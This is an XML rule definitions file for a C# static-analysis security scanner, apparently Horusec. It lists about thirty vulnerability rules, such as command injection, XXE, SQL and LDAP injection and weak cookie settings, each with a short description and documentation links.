<rules>
  <rule>
    <key>HS-CSHARP-1</key>
    <name>Command Injection</name>
    <description>
      <![CDATA[If a malicious user controls either the FileName or Arguments, he might be able to execute unwanted commands or add unwanted argument. This behavior would not be possible if input parameter are validate against a white-list of characters. For more information access: (https://security-code-scan.github.io/#SCS0001). <br/> <a href='https://docs.horusec.io/docs/cli/analysis-tools/open-source-horusec-engine/horusec-csharp#command-injection' target='_blank'> https://docs.horusec.io/docs/cli/analysis-tools/open-source-horusec-engine/horusec-csharp#command-injection</a>]]>
    </description>
    <type>VULNERABILITY</type>
    <help>
      <![CDATA[<a href='https://docs.horusec.io/docs/cli/analysis-tools/open-source-horusec-engine/horusec-csharp#command-injection' target='_blank'> Rule Docs</a> <br/> <a href='https://security-code-scan.github.io/#SCS0001' target='_blank'>https://security-code-scan.github.io/#SCS0001</a>]]>
    </help>
  </rule>
  <rule>
    <key>HS-CSHARP-2</key>
    <name>XPath Injection</name>
    <description>
      <![CDATA[If the user input is not properly filtered, a malicious user could extend the XPath query. For more information access: (https://security-code-scan.github.io/#SCS0003). <br/> <a href='https://docs.horusec.io/docs/cli/analysis-tools/open-source-horusec-engine/horusec-csharp#xpath-injection' target='_blank'> https://docs.horusec.io/docs/cli/analysis-tools/open-source-horusec-engine/horusec-csharp#xpath-injection</a>]]>
    </description>
    <type>VULNERABILITY</type>
    <help>
      <![CDATA[<a href='https://docs.horusec.io/docs/cli/analysis-tools/open-source-horusec-engine/horusec-csharp#xpath-injection' target='_blank'> Rule Docs</a> <br/> <a href='https://security-code-scan.github.io/#SCS0003' target='_blank'>https://security-code-scan.github.io/#SCS0003</a>]]>
    </help>
  </rule>
  <rule>
    <key>HS-CSHARP-3</key>
    <name>XML eXternal Entity Injection (XXE)</name>
    <description>
      <![CDATA[The XML parser is configured incorrectly. The operation could be vulnerable to XML eXternal Entity (XXE) processing. For more information access: (https://security-code-scan.github.io/#SCS0007). <br/> <a href='https://docs.horusec.io/docs/cli/analysis-tools/open-source-horusec-engine/horusec-csharp#xml-external-entity-injection-xxe' target='_blank'> https://docs.horusec.io/docs/cli/analysis-tools/open-source-horusec-engine/horusec-csharp#xml-external-entity-injection-xxe</a>]]>
    </description>
    <type>VULNERABILITY</type>
    <help>
      <![CDATA[<a href='https://docs.horusec.io/docs/cli/analysis-tools/open-source-horusec-engine/horusec-csharp#xml-external-entity-injection-xxe' target='_blank'> Rule Docs</a> <br/> <a href='https://security-code-scan.github.io/#SCS0007' target='_blank'>https://security-code-scan.github.io/#SCS0007</a>]]>
    </help>
  </rule>
  <rule>
    <key>HS-CSHARP-4</key>
    <name>Path Traversal</name>
    <description>
      <![CDATA[A path traversal attack (also known as directory traversal) aims to access files and directories that are stored outside the expected directory.By manipulating variables that reference files with &#8220;dot-dot-slash (../)&#8221; sequences and its variations or by using absolute file paths, it may be possible to access arbitrary files and directories stored on file system including application source code or configuration and critical system files. For more information access: (https://security-code-scan.github.io/#SCS0018). <br/> <a href='https://docs.horusec.io/docs/cli/analysis-tools/open-source-horusec-engine/horusec-csharp#path-traversal' target='_blank'> https://docs.horusec.io/docs/cli/analysis-tools/open-source-horusec-engine/horusec-csharp#path-traversal</a>]]>
    </description>
    <type>VULNERABILITY</type>
    <help>
      <![CDATA[<a href='https://docs.horusec.io/docs/cli/analysis-tools/open-source-horusec-engine/horusec-csharp#path-traversal' target='_blank'> Rule Docs</a> <br/> <a href='https://security-code-scan.github.io/#SCS0018' target='_blank'>https://security-code-scan.github.io/#SCS0018</a>]]>
    </help>
  </rule>
  <rule>
    <key>HS-CSHARP-5</key>
    <name>SQL Injection WebControls</name>
    <description>
      <![CDATA[Malicious user might get direct read and/or write access to the database. If the database is poorly configured the attacker might even get Remote Code Execution (RCE) on the machine running the database. For more information access: (https://security-code-scan.github.io/#SCS0014). <br/> <a href='https://docs.horusec.io/docs/cli/analysis-tools/open-source-horusec-engine/horusec-csharp#sql-injection-webcontrols' target='_blank'> https://docs.horusec.io/docs/cli/analysis-tools/open-source-horusec-engine/horusec-csharp#sql-injection-webcontrols</a>]]>
    </description>
    <type>VULNERABILITY</type>
    <help>
      <![CDATA[<a href='https://docs.horusec.io/docs/cli/analysis-tools/open-source-horusec-engine/horusec-csharp#sql-injection-webcontrols' target='_blank'> Rule Docs</a> <br/> <a href='https://security-code-scan.github.io/#SCS0014' target='_blank'>https://security-code-scan.github.io/#SCS0014</a>]]>
    </help>
  </rule>
  <rule>
    <key>HS-CSHARP-6</key>
    <name>Weak Cipher Mode</name>
    <description>
      <![CDATA[The cipher provides no way to detect that the data has been tampered with. If the cipher text can be controlled by an attacker, it could be altered without detection. The use of AES in CBC mode with a HMAC is recommended guaranteeing integrity and confidentiality. For more information access: (https://security-code-scan.github.io/#SCS0013). <br/> <a href='https://docs.horusec.io/docs/cli/analysis-tools/open-source-horusec-engine/horusec-csharp#weak-cipher-mode' target='_blank'> https://docs.horusec.io/docs/cli/analysis-tools/open-source-horusec-engine/horusec-csharp#weak-cipher-mode</a>]]>
    </description>
    <type>VULNERABILITY</type>
    <help>
      <![CDATA[<a href='https://docs.horusec.io/docs/cli/analysis-tools/open-source-horusec-engine/horusec-csharp#weak-cipher-mode' target='_blank'> Rule Docs</a> <br/> <a href='https://security-code-scan.github.io/#SCS0013' target='_blank'>https://security-code-scan.github.io/#SCS0013</a>]]>
    </help>
  </rule>
  <rule>
    <key>HS-CSHARP-7</key>
    <name>Forms Authentication Cookieless Mode</name>
    <description>
      <![CDATA[Authentication cookies should not be sent in the URL. Doing so allows attackers to gain unauthorized access to authentication tokens (web server logs, referrer headers, and browser history) and more easily perform session fixation / hijacking attacks. For more information checkout the CWE-598 (https://cwe.mitre.org/data/definitions/598.html) advisory. <br/> <a href='https://docs.horusec.io/docs/cli/analysis-tools/open-source-horusec-engine/horusec-csharp#forms-authentication-cookieless-mode' target='_blank'> https://docs.horusec.io/docs/cli/analysis-tools/open-source-horusec-engine/horusec-csharp#forms-authentication-cookieless-mode</a>]]>
    </description>
    <type>VULNERABILITY</type>
    <help>
      <![CDATA[<a href='https://docs.horusec.io/docs/cli/analysis-tools/open-source-horusec-engine/horusec-csharp#forms-authentication-cookieless-mode' target='_blank'> Rule Docs</a> <br/> <a href='https://cwe.mitre.org/data/definitions/598.html' target='_blank'>https://cwe.mitre.org/data/definitions/598.html</a>]]>
    </help>
  </rule>
  <rule>
    <key>HS-CSHARP-8</key>
    <name>Forms Authentication Cross App Redirects</name>
    <description>
      <![CDATA[Enabling cross-application redirects can allow unvalidated redirect attacks via the returnUrl parameter during the login process. Disable cross-application redirects to by setting the enableCrossAppRedirects attribute to false. For more information checkout the CWE-601 (https://cwe.mitre.org/data/definitions/601.html) advisory. <br/> <a href='https://docs.horusec.io/docs/cli/analysis-tools/open-source-horusec-engine/horusec-csharp#forms-authentication-cross-app-redirects' target='_blank'> https://docs.horusec.io/docs/cli/analysis-tools/open-source-horusec-engine/horusec-csharp#forms-authentication-cross-app-redirects</a>]]>
    </description>
    <type>VULNERABILITY</type>
    <help>
      <![CDATA[<a href='https://docs.horusec.io/docs/cli/analysis-tools/open-source-horusec-engine/horusec-csharp#forms-authentication-cross-app-redirects' target='_blank'> Rule Docs</a> <br/> <a href='https://cwe.mitre.org/data/definitions/601.html' target='_blank'>https://cwe.mitre.org/data/definitions/601.html</a>]]>
    </help>
  </rule>
  <rule>
    <key>HS-CSHARP-9</key>
    <name>Forms Authentication Weak Cookie Protection</name>
    <description>
      <![CDATA[Forms Authentication cookies must use strong encryption and message authentication code (MAC) validation to protect the cookie value from inspection and tampering. Configure the forms element&#8217;s protection attribute to All to enable cookie data validation and encryption. For more information checkout the CWE-565 (https://cwe.mitre.org/data/definitions/565.html) advisory. <br/> <a href='https://docs.horusec.io/docs/cli/analysis-tools/open-source-horusec-engine/horusec-csharp#forms-authentication-weak-cookie-protection' target='_blank'> https://docs.horusec.io/docs/cli/analysis-tools/open-source-horusec-engine/horusec-csharp#forms-authentication-weak-cookie-protection</a>]]>
    </description>
    <type>VULNERABILITY</type>
    <help>
      <![CDATA[<a href='https://docs.horusec.io/docs/cli/analysis-tools/open-source-horusec-engine/horusec-csharp#forms-authentication-weak-cookie-protection' target='_blank'> Rule Docs</a> <br/> <a href='https://cwe.mitre.org/data/definitions/565.html' target='_blank'>https://cwe.mitre.org/data/definitions/565.html</a>]]>
    </help>
  </rule>
  <rule>
    <key>HS-CSHARP-10</key>
    <name>Forms Authentication Weak Timeout</name>
    <description>
      <![CDATA[Excessive authentication timeout values provide attackers with a large window of opportunity to hijack user&#8217;s authentication tokens. For more information checkout the CWE-613 (https://cwe.mitre.org/data/definitions/613.html) advisory. <br/> <a href='https://docs.horusec.io/docs/cli/analysis-tools/open-source-horusec-engine/horusec-csharp#forms-authentication-weak-timeout' target='_blank'> https://docs.horusec.io/docs/cli/analysis-tools/open-source-horusec-engine/horusec-csharp#forms-authentication-weak-timeout</a>]]>
    </description>
    <type>VULNERABILITY</type>
    <help>
      <![CDATA[<a href='https://docs.horusec.io/docs/cli/analysis-tools/open-source-horusec-engine/horusec-csharp#forms-authentication-weak-timeout' target='_blank'> Rule Docs</a> <br/> <a href='https://cwe.mitre.org/data/definitions/613.html' target='_blank'>https://cwe.mitre.org/data/definitions/613.html</a>]]>
    </help>
  </rule>
  <rule>
    <key>HS-CSHARP-11</key>
    <name>Header Checking Disabled</name>
    <description>
      <![CDATA[Disabling the HTTP Runtime header checking protection opens the application up to HTTP Header Injection (aka Response Splitting) attacks. Enable the header checking protection by setting the httpRuntime element&#8217;s enableHeaderChecking attribute to true, which is the default value. For more information checkout the CWE-113 (https://cwe.mitre.org/data/definitions/113.html) advisory. <br/> <a href='https://docs.horusec.io/docs/cli/analysis-tools/open-source-horusec-engine/horusec-csharp#header-checking-disabled' target='_blank'> https://docs.horusec.io/docs/cli/analysis-tools/open-source-horusec-engine/horusec-csharp#header-checking-disabled</a>]]>
    </description>
    <type>VULNERABILITY</type>
    <help>
      <![CDATA[<a href='https://docs.horusec.io/docs/cli/analysis-tools/open-source-horusec-engine/horusec-csharp#header-checking-disabled' target='_blank'> Rule Docs</a> <br/> <a href='https://cwe.mitre.org/data/definitions/113.html' target='_blank'>https://cwe.mitre.org/data/definitions/113.html</a>]]>
    </help>
  </rule>
  <rule>
    <key>HS-CSHARP-12</key>
    <name>Version Header Enabled</name>
    <description>
      <![CDATA[The Version HTTP response header sends the ASP.NET framework version to the client&#8217;s browser. This information can help an attacker identify vulnerabilities in the server&#8217;s framework version and should be disabled in production. Disable the version response header by setting the httpRuntime element&#8217;s enableVersionHeader attribute to false. For more information checkout the CWE-200 (https://cwe.mitre.org/data/definitions/200.html) advisory. <br/> <a href='https://docs.horusec.io/docs/cli/analysis-tools/open-source-horusec-engine/horusec-csharp#version-header-enabled' target='_blank'> https://docs.horusec.io/docs/cli/analysis-tools/open-source-horusec-engine/horusec-csharp#version-header-enabled</a>]]>
    </description>
    <type>VULNERABILITY</type>
    <help>
      <![CDATA[<a href='https://docs.horusec.io/docs/cli/analysis-tools/open-source-horusec-engine/horusec-csharp#version-header-enabled' target='_blank'> Rule Docs</a> <br/> <a href='https://cwe.mitre.org/data/definitions/200.html' target='_blank'>https://cwe.mitre.org/data/definitions/200.html</a>]]>
    </help>
  </rule>
  <rule>
    <key>HS-CSHARP-13</key>
    <name>Event Validation Disabled</name>
    <description>
      <![CDATA[Event validation prevents unauthorized post backs in web form applications. Disabling this feature can allow attackers to forge requests from controls not visible or enabled on a given web form. Enable event validation by setting the page element&#8217;s eventValidation attribute to true. For more information checkout the CWE-807 (https://cwe.mitre.org/data/definitions/807.html) advisory. <br/> <a href='https://docs.horusec.io/docs/cli/analysis-tools/open-source-horusec-engine/horusec-csharp#event-validation-disabled' target='_blank'> https://docs.horusec.io/docs/cli/analysis-tools/open-source-horusec-engine/horusec-csharp#event-validation-disabled</a>]]>
    </description>
    <type>VULNERABILITY</type>
    <help>
      <![CDATA[<a href='https://docs.horusec.io/docs/cli/analysis-tools/open-source-horusec-engine/horusec-csharp#event-validation-disabled' target='_blank'> Rule Docs</a> <br/> <a href='https://cwe.mitre.org/data/definitions/807.html' target='_blank'>https://cwe.mitre.org/data/definitions/807.html</a>]]>
    </help>
  </rule>
  <rule>
    <key>HS-CSHARP-14</key>
    <name>Weak Session Timeout</name>
    <description>
      <![CDATA[If session data is used by the application for authentication, excessive timeout values provide attackers with a large window of opportunity to hijack user&#8217;s session tokens. Configure the session timeout value to meet your organization&#8217;s timeout policy. For more information checkout the CWE-613 (https://cwe.mitre.org/data/definitions/613.html) advisory. <br/> <a href='https://docs.horusec.io/docs/cli/analysis-tools/open-source-horusec-engine/horusec-csharp#weak-session-timeout' target='_blank'> https://docs.horusec.io/docs/cli/analysis-tools/open-source-horusec-engine/horusec-csharp#weak-session-timeout</a>]]>
    </description>
    <type>VULNERABILITY</type>
    <help>
      <![CDATA[<a href='https://docs.horusec.io/docs/cli/analysis-tools/open-source-horusec-engine/horusec-csharp#weak-session-timeout' target='_blank'> Rule Docs</a> <br/> <a href='https://cwe.mitre.org/data/definitions/613.html' target='_blank'>https://cwe.mitre.org/data/definitions/613.html</a>]]>
    </help>
  </rule>
  <rule>
    <key>HS-CSHARP-15</key>
    <name>Weak Session Timeout</name>
    <description>
      <![CDATA[The session StateServer mode transports session data insecurely to a remote server. The remote server also does not require system authentication to access the session data for an application. This risk depends entirely on the sensitivity of the data stored in the user&#8217;s session. If the session data is considered sensitive, consider adding an external control (e.g. IPSEC) that provides mutual authentication and transport security. For more information checkout the CWE-319 (https://cwe.mitre.org/data/definitions/319.html) advisory. <br/> <a href='https://docs.horusec.io/docs/cli/analysis-tools/open-source-horusec-engine/horusec-csharp#weak-session-timeout-1' target='_blank'> https://docs.horusec.io/docs/cli/analysis-tools/open-source-horusec-engine/horusec-csharp#weak-session-timeout-1</a>]]>
    </description>
    <type>VULNERABILITY</type>
    <help>
      <![CDATA[<a href='https://docs.horusec.io/docs/cli/analysis-tools/open-source-horusec-engine/horusec-csharp#weak-session-timeout-1' target='_blank'> Rule Docs</a> <br/> <a href='https://cwe.mitre.org/data/definitions/319.html' target='_blank'>https://cwe.mitre.org/data/definitions/319.html</a>]]>
    </help>
  </rule>
  <rule>
    <key>HS-CSHARP-16</key>
    <name>Jwt Signature Validation Disabled</name>
    <description>
      <![CDATA[Web service APIs relying on JSON Web Tokens (JWT) for authentication and authorization must sign each JWT with a private key or secret. Each web service endpoint must require JWT signature validation prior to decoding and using the token to access protected resources. The values RequireExpirationTime, RequireSignedTokens, ValidateLifetime can&#8217;t was false. For more information checkout the CWE-347 (https://cwe.mitre.org/data/definitions/347.html) and CWE-613 (https://cwe.mitre.org/data/definitions/613.html) advisory. <br/> <a href='https://docs.horusec.io/docs/cli/analysis-tools/open-source-horusec-engine/horusec-csharp#jwt-signature-validation-disabled' target='_blank'> https://docs.horusec.io/docs/cli/analysis-tools/open-source-horusec-engine/horusec-csharp#jwt-signature-validation-disabled</a>]]>
    </description>
    <type>VULNERABILITY</type>
    <help>
      <![CDATA[<a href='https://docs.horusec.io/docs/cli/analysis-tools/open-source-horusec-engine/horusec-csharp#jwt-signature-validation-disabled' target='_blank'> Rule Docs</a> <br/> <a href='https://cwe.mitre.org/data/definitions/347.html' target='_blank'>https://cwe.mitre.org/data/definitions/347.html</a>]]>
    </help>
  </rule>
  <rule>
    <key>HS-CSHARP-17</key>
    <name>Insecure Http Cookie Transport</name>
    <description>
      <![CDATA[Cookies containing authentication tokens, session tokens, and other state management credentials must be protected in transit across a network. Set the cookie options&#8217; Secure property to true to prevent the browser from transmitting cookies over HTTP. For more information checkout the CWE-614 (https://cwe.mitre.org/data/definitions/614.html) advisory. <br/> <a href='https://docs.horusec.io/docs/cli/analysis-tools/open-source-horusec-engine/horusec-csharp#insecure-http-cookie-transport' target='_blank'> https://docs.horusec.io/docs/cli/analysis-tools/open-source-horusec-engine/horusec-csharp#insecure-http-cookie-transport</a>]]>
    </description>
    <type>VULNERABILITY</type>
    <help>
      <![CDATA[<a href='https://docs.horusec.io/docs/cli/analysis-tools/open-source-horusec-engine/horusec-csharp#insecure-http-cookie-transport' target='_blank'> Rule Docs</a> <br/> <a href='https://cwe.mitre.org/data/definitions/614.html' target='_blank'>https://cwe.mitre.org/data/definitions/614.html</a>]]>
    </help>
  </rule>
  <rule>
    <key>HS-CSHARP-18</key>
    <name>Http Cookie Accessible Via Script</name>
    <description>
      <![CDATA[Cookies containing authentication tokens, session tokens, and other state management credentials should be protected from malicious JavaScript running in the browser. Setting the httpOnly attribute to false can allow attackers to inject malicious scripts into the site and extract authentication cookie values to a remote server. Configure the cookie options&#8217; httpOnly property to true, which prevents cookie access from scripts running in the browser. For more information checkout the CWE-1004 (https://cwe.mitre.org/data/definitions/1004.html) advisory. <br/> <a href='https://docs.horusec.io/docs/cli/analysis-tools/open-source-horusec-engine/horusec-csharp#http-cookie-accessible-via-script' target='_blank'> https://docs.horusec.io/docs/cli/analysis-tools/open-source-horusec-engine/horusec-csharp#http-cookie-accessible-via-script</a>]]>
    </description>
    <type>VULNERABILITY</type>
    <help>
      <![CDATA[<a href='https://docs.horusec.io/docs/cli/analysis-tools/open-source-horusec-engine/horusec-csharp#http-cookie-accessible-via-script' target='_blank'> Rule Docs</a> <br/> <a href='https://cwe.mitre.org/data/definitions/1004.html' target='_blank'>https://cwe.mitre.org/data/definitions/1004.html</a>]]>
    </help>
  </rule>
  <rule>
    <key>HS-CSHARP-19</key>
    <name>Directory Listing Enabled</name>
    <description>
      <![CDATA[Directory listing provides a complete index of the resources located in a web directory. Enabling directory listing can expose sensitive resources such as application binaries, configuration files, and static content that should not be exposed. Unless directory listing is required to meet the application&#8217;s functional requirements, disable the listing by setting the directoryBrowse element&#8217;s enabled attribute to false. For more information checkout the CWE-548 (https://cwe.mitre.org/data/definitions/548.html) advisory. <br/> <a href='https://docs.horusec.io/docs/cli/analysis-tools/open-source-horusec-engine/horusec-csharp#directory-listing-enabled' target='_blank'> https://docs.horusec.io/docs/cli/analysis-tools/open-source-horusec-engine/horusec-csharp#directory-listing-enabled</a>]]>
    </description>
    <type>VULNERABILITY</type>
    <help>
      <![CDATA[<a href='https://docs.horusec.io/docs/cli/analysis-tools/open-source-horusec-engine/horusec-csharp#directory-listing-enabled' target='_blank'> Rule Docs</a> <br/> <a href='https://cwe.mitre.org/data/definitions/548.html' target='_blank'>https://cwe.mitre.org/data/definitions/548.html</a>]]>
    </help>
  </rule>
  <rule>
    <key>HS-CSHARP-20</key>
    <name>Ldap Authentication Disabled</name>
    <description>
      <![CDATA[Disabling LDAP Authentication configures insecure connections to the backend LDAP provider. Using the DirectoryEntry AuthenticationType property&#8217;s Anonymous or None option allows an anonymous or basic authentication connection to the LDAP provider. Set the the DirectoryEntry AuthenticationType property to Secure, which requests Kerberos authentication under the security context of the calling thread or as a provider username and password. For more information checkout the CWE-287 (https://cwe.mitre.org/data/definitions/287.html) advisory. <br/> <a href='https://docs.horusec.io/docs/cli/analysis-tools/open-source-horusec-engine/horusec-csharp#ldap-authentication-disabled' target='_blank'> https://docs.horusec.io/docs/cli/analysis-tools/open-source-horusec-engine/horusec-csharp#ldap-authentication-disabled</a>]]>
    </description>
    <type>VULNERABILITY</type>
    <help>
      <![CDATA[<a href='https://docs.horusec.io/docs/cli/analysis-tools/open-source-horusec-engine/horusec-csharp#ldap-authentication-disabled' target='_blank'> Rule Docs</a> <br/> <a href='https://cwe.mitre.org/data/definitions/287.html' target='_blank'>https://cwe.mitre.org/data/definitions/287.html</a>]]>
    </help>
  </rule>
  <rule>
    <key>HS-CSHARP-21</key>
    <name>Certificate Validation Disabled</name>
    <description>
      <![CDATA[Disabling certificate validation is common in testing and development environments. Quite often, this is accidentally deployed to production, leaving the application vulnerable to man-in-the-middle attacks on insecure networks. For more information checkout the CWE-295 (https://cwe.mitre.org/data/definitions/295.html) advisory. <br/> <a href='https://docs.horusec.io/docs/cli/analysis-tools/open-source-horusec-engine/horusec-csharp#certificate-validation-disabled' target='_blank'> https://docs.horusec.io/docs/cli/analysis-tools/open-source-horusec-engine/horusec-csharp#certificate-validation-disabled</a>]]>
    </description>
    <type>VULNERABILITY</type>
    <help>
      <![CDATA[<a href='https://docs.horusec.io/docs/cli/analysis-tools/open-source-horusec-engine/horusec-csharp#certificate-validation-disabled' target='_blank'> Rule Docs</a> <br/> <a href='https://cwe.mitre.org/data/definitions/295.html' target='_blank'>https://cwe.mitre.org/data/definitions/295.html</a>]]>
    </help>
  </rule>
  <rule>
    <key>HS-CSHARP-22</key>
    <name>Action Request Validation Disabled</name>
    <description>
      <![CDATA[Request validation performs blacklist input validation for XSS payloads found in form and URL request parameters. Request validation has known bypass issues and does not prevent all XSS attacks, but it does provide a strong countermeasure for most payloads targeting a HTML context. For more information checkout the CWE-20 (https://cwe.mitre.org/data/definitions/20.html) advisory. <br/> <a href='https://docs.horusec.io/docs/cli/analysis-tools/open-source-horusec-engine/horusec-csharp#action-request-validation-disabled' target='_blank'> https://docs.horusec.io/docs/cli/analysis-tools/open-source-horusec-engine/horusec-csharp#action-request-validation-disabled</a>]]>
    </description>
    <type>VULNERABILITY</type>
    <help>
      <![CDATA[<a href='https://docs.horusec.io/docs/cli/analysis-tools/open-source-horusec-engine/horusec-csharp#action-request-validation-disabled' target='_blank'> Rule Docs</a> <br/> <a href='https://cwe.mitre.org/data/definitions/20.html' target='_blank'>https://cwe.mitre.org/data/definitions/20.html</a>]]>
    </help>
  </rule>
  <rule>
    <key>HS-CSHARP-23</key>
    <name>Xml Document External Entity Expansion</name>
    <description>
      <![CDATA[XML External Entity (XXE) vulnerabilities occur when applications process untrusted XML data without disabling external entities and DTD processing. Processing untrusted XML data with a vulnerable parser can allow attackers to extract data from the server, perform denial of service attacks, and in some cases gain remote code execution. The XmlDocument class is vulnerable to XXE attacks when setting the XmlResolver property to resolve external entities. To prevent XmlDocument XXE attacks, set the XmlResolver property to null. For more information checkout the CWE-611 (https://cwe.mitre.org/data/definitions/611.html) advisory. <br/> <a href='https://docs.horusec.io/docs/cli/analysis-tools/open-source-horusec-engine/horusec-csharp#xml-document-external-entity-expansion' target='_blank'> https://docs.horusec.io/docs/cli/analysis-tools/open-source-horusec-engine/horusec-csharp#xml-document-external-entity-expansion</a>]]>
    </description>
    <type>VULNERABILITY</type>
    <help>
      <![CDATA[<a href='https://docs.horusec.io/docs/cli/analysis-tools/open-source-horusec-engine/horusec-csharp#xml-document-external-entity-expansion' target='_blank'> Rule Docs</a> <br/> <a href='https://cwe.mitre.org/data/definitions/611.html' target='_blank'>https://cwe.mitre.org/data/definitions/611.html</a>]]>
    </help>
  </rule>
  <rule>
    <key>HS-CSHARP-24</key>
    <name>Ldap Injection Filter Assignment</name>
    <description>
      <![CDATA[LDAP Injection vulnerabilities occur when untrusted data is concatenated into a LDAP Path or Filter expression without properly escaping control characters. This can allow attackers to change the meaning of an LDAP query and gain access to resources for which they are not authorized. For more information checkout the CWE-90 (https://cwe.mitre.org/data/definitions/90.html) advisory. <br/> <a href='https://docs.horusec.io/docs/cli/analysis-tools/open-source-horusec-engine/horusec-csharp#ldap-injection-filter-assignment' target='_blank'> https://docs.horusec.io/docs/cli/analysis-tools/open-source-horusec-engine/horusec-csharp#ldap-injection-filter-assignment</a>]]>
    </description>
    <type>VULNERABILITY</type>
    <help>
      <![CDATA[<a href='https://docs.horusec.io/docs/cli/analysis-tools/open-source-horusec-engine/horusec-csharp#ldap-injection-filter-assignment' target='_blank'> Rule Docs</a> <br/> <a href='https://cwe.mitre.org/data/definitions/90.html' target='_blank'>https://cwe.mitre.org/data/definitions/90.html</a>]]>
    </help>
  </rule>
  <rule>
    <key>HS-CSHARP-25</key>
    <name>Sql Injection: Dynamic NHibernate Query</name>
    <description>
      <![CDATA[Concatenating untrusted data into a dynamic SQL string and calling vulnerable NHibernate Framework methods can allow SQL Injection. To ensure calls to vulnerable NHibernate Framework methods are parameterized, pass positional or named parameters in the statement. The following NHibernate methods allow for raw SQL queries to be executed: CreateQuery CreateSqlQuery To ensure calls to vulnerable NHibernate methods are parameterized, use named parameters in the raw SQL query. Then, set the named parameter values when executing the query. For more information checkout the CWE-89 (https://cwe.mitre.org/data/definitions/89.html) advisory. <br/> <a href='https://docs.horusec.io/docs/cli/analysis-tools/open-source-horusec-engine/horusec-csharp#sql-injection-dynamic-nhibernate-query' target='_blank'> https://docs.horusec.io/docs/cli/analysis-tools/open-source-horusec-engine/horusec-csharp#sql-injection-dynamic-nhibernate-query</a>]]>
    </description>
    <type>VULNERABILITY</type>
    <help>
      <![CDATA[<a href='https://docs.horusec.io/docs/cli/analysis-tools/open-source-horusec-engine/horusec-csharp#sql-injection-dynamic-nhibernate-query' target='_blank'> Rule Docs</a> <br/> <a href='https://cwe.mitre.org/data/definitions/89.html' target='_blank'>https://cwe.mitre.org/data/definitions/89.html</a>]]>
    </help>
  </rule>
  <rule>
    <key>HS-CSHARP-26</key>
    <name>Ldap Injection Directory Searcher</name>
    <description>
      <![CDATA[LDAP Injection vulnerabilities occur when untrusted data is concatenated into a LDAP Path or Filter expression without properly escaping control characters. This can allow attackers to change the meaning of an LDAP query and gain access to resources for which they are not authorized. For more information checkout the CWE-90 (https://cwe.mitre.org/data/definitions/90.html) advisory. <br/> <a href='https://docs.horusec.io/docs/cli/analysis-tools/open-source-horusec-engine/horusec-csharp#ldap-injection-directory-searcher' target='_blank'> https://docs.horusec.io/docs/cli/analysis-tools/open-source-horusec-engine/horusec-csharp#ldap-injection-directory-searcher</a>]]>
    </description>
    <type>VULNERABILITY</type>
    <help>
      <![CDATA[<a href='https://docs.horusec.io/docs/cli/analysis-tools/open-source-horusec-engine/horusec-csharp#ldap-injection-directory-searcher' target='_blank'> Rule Docs</a> <br/> <a href='https://cwe.mitre.org/data/definitions/90.html' target='_blank'>https://cwe.mitre.org/data/definitions/90.html</a>]]>
    </help>
  </rule>
  <rule>
    <key>HS-CSHARP-27</key>
    <name>Ldap Injection Path Assignment</name>
    <description>
      <![CDATA[LDAP Injection vulnerabilities occur when untrusted data is concatenated into a LDAP Path or Filter expression without properly escaping control characters. This can allow attackers to change the meaning of an LDAP query and gain access to resources for which they are not authorized. For more information checkout the CWE-90 (https://cwe.mitre.org/data/definitions/90.html) advisory. <br/> <a href='https://docs.horusec.io/docs/cli/analysis-tools/open-source-horusec-engine/horusec-csharp#ldap-injection-path-assignment' target='_blank'> https://docs.horusec.io/docs/cli/analysis-tools/open-source-horusec-engine/horusec-csharp#ldap-injection-path-assignment</a>]]>
    </description>
    <type>VULNERABILITY</type>
    <help>
      <![CDATA[<a href='https://docs.horusec.io/docs/cli/analysis-tools/open-source-horusec-engine/horusec-csharp#ldap-injection-path-assignment' target='_blank'> Rule Docs</a> <br/> <a href='https://cwe.mitre.org/data/definitions/90.html' target='_blank'>https://cwe.mitre.org/data/definitions/90.html</a>]]>
    </help>
  </rule>
  <rule>
    <key>HS-CSHARP-28</key>
    <name>LDAP Injection</name>
    <description>
      <![CDATA[The dynamic value passed to the LDAP query should be validated. For more information access: (https://security-code-scan.github.io/#SCS0031). <br/> <a href='https://docs.horusec.io/docs/cli/analysis-tools/open-source-horusec-engine/horusec-csharp#ldap-injection' target='_blank'> https://docs.horusec.io/docs/cli/analysis-tools/open-source-horusec-engine/horusec-csharp#ldap-injection</a>]]>
    </description>
    <type>VULNERABILITY</type>
    <help>
      <![CDATA[<a href='https://docs.horusec.io/docs/cli/analysis-tools/open-source-horusec-engine/horusec-csharp#ldap-injection' target='_blank'> Rule Docs</a> <br/> <a href='https://security-code-scan.github.io/#SCS0031' target='_blank'>https://security-code-scan.github.io/#SCS0031</a>]]>
    </help>
  </rule>
  <rule>
    <key>HS-CSHARP-29</key>
    <name>SQL Injection LINQ</name>
    <description>
      <![CDATA[Malicious user might get direct read and/or write access to the database. If the database is poorly configured the attacker might even get Remote Code Execution (RCE) on the machine running the database.. For more information access: (https://security-code-scan.github.io/#SCS0002). <br/> <a href='https://docs.horusec.io/docs/cli/analysis-tools/open-source-horusec-engine/horusec-csharp#sql-injection-linq' target='_blank'> https://docs.horusec.io/docs/cli/analysis-tools/open-source-horusec-engine/horusec-csharp#sql-injection-linq</a>]]>
    </description>
    <type>VULNERABILITY</type>
    <help>
      <![CDATA[<a href='https://docs.horusec.io/docs/cli/analysis-tools/open-source-horusec-engine/horusec-csharp#sql-injection-linq' target='_blank'> Rule Docs</a> <br/> <a href='https://security-code-scan.github.io/#SCS0002' target='_blank'>https://security-code-scan.github.io/#SCS0002</a>]]>
    </help>
  </rule>
  <rule>
    <key>HS-CSHARP-30</key>
    <name>Insecure Deserialization</name>
    <description>
      <![CDATA[Arbitrary code execution, full application compromise or denial of service. An attacker may pass specially crafted serialized .NET object of specific class that will execute malicious code during the construction of the object. For more information access: (https://security-code-scan.github.io/#SCS0028). <br/> <a href='https://docs.horusec.io/docs/cli/analysis-tools/open-source-horusec-engine/horusec-csharp#insecure-deserialization' target='_blank'> https://docs.horusec.io/docs/cli/analysis-tools/open-source-horusec-engine/horusec-csharp#insecure-deserialization</a>]]>
    </description>
    <type>VULNERABILITY</type>
    <help>
      <![CDATA[<a href='https://docs.horusec.io/docs/cli/analysis-tools/open-source-horusec-engine/horusec-csharp#insecure-deserialization' target='_blank'> Rule Docs</a> <br/> <a href='https://security-code-scan.github.io/#SCS0028' target='_blank'>https://security-code-scan.github.io/#SCS0028</a>]]>
    </help>
  </rule>
  <rule>
    <key>HS-CSHARP-31</key>
    <name>SQL Injection Enterprise Library Data</name>
    <description>
